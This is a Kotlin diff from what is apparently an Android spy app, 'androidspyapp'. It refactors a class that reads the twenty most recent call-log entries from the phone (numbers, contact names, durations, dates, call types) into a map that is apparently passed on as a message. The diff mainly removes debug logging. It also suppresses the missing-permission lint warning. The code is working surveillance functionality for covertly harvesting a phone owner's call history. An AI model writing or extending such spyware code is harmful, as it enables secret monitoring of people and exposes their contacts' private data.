@@ -4,41 +4,40 @@ import android.annotation.SuppressLint
 import android.content.Context
 import android.database.Cursor
 import android.provider.CallLog
-import android.util.Log
 import com.komnacki.androidspyapp.Message
 import java.text.SimpleDateFormat
 import java.util.*
 
 
-public class CalllogState(override var context: Context) : Message {
+class CalllogState(override var context: Context) : Message {
     init {
-        Log.d("KK: ", "CallogState")
-        getCallogState(
-            context
-        )
+        getCallogState(context)
     }
+
     companion object {
-        private val info : MutableMap<String, Any> = mutableMapOf()
+        private val info: MutableMap<String, Any> = mutableMapOf()
+        private val dateAndTimePatern = "yyyy-MM-dd HH:mm:ss"
 
         @SuppressLint("MissingPermission")
         fun getCallogState(context: Context) {
-            val c : Cursor? = context.contentResolver
+            val c: Cursor? = context.contentResolver
                 .query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC")
-            val logs = mutableListOf<com.komnacki.androidspyapp.calllog.Log>()
-            
-            Log.d("KK: ", "initialize callog cursor")
-            
 
-            if(c != null) {
+            if (c != null) {
                 var index = 0
                 while (c.moveToNext() && index < 20) {
                     val number = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER))
                     val name = c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME))
                     val duration = c.getString(c.getColumnIndex(CallLog.Calls.DURATION))
-                    Log.d("KK: ", "c.getLong(c.getColumnIndex(CallLog.Calls.DATE): " + c.getLong(c.getColumnIndex(CallLog.Calls.DATE)))
 
-                    val date = SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(Date(c.getLong(c.getColumnIndex(CallLog.Calls.DATE))))
-                    val type = when(c.getString(c.getColumnIndex(CallLog.Calls.TYPE)).toInt()) {
+                    val date = SimpleDateFormat(dateAndTimePatern).format(
+                        Date(
+                            c.getLong(
+                                c.getColumnIndex(CallLog.Calls.DATE)
+                            )
+                        )
+                    )
+                    val type = when (c.getString(c.getColumnIndex(CallLog.Calls.TYPE)).toInt()) {
                         CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                         CallLog.Calls.INCOMING_TYPE -> "Incoming"
                         CallLog.Calls.MISSED_TYPE -> "Missed"
@@ -53,7 +52,6 @@ public class CalllogState(override var context: Context) : Message {
                         date,
                         type
                     )
-                    Log.d("KK: ", "log: " + log)
                     info[log.date + " " + log.name] = log
                     index++
                 }
